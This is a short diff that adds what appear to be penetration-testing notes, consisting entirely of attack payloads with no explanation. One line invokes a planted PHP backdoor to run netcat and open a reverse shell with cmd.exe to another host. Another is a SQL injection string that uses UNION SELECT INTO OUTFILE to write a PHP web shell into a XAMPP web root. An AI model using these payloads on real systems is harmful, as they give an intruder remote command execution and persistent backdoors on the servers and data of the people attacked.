@@ -1,0 +1,4 @@
+10.11.25.68/backdoor.php?cmd=nc -nv 10.11.0.210 443 -e cmd.exe
+
+
+' union select all 1,2,3,4,5,"<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE 'c:/xampp/htdocs/backdoor2.php' ;#
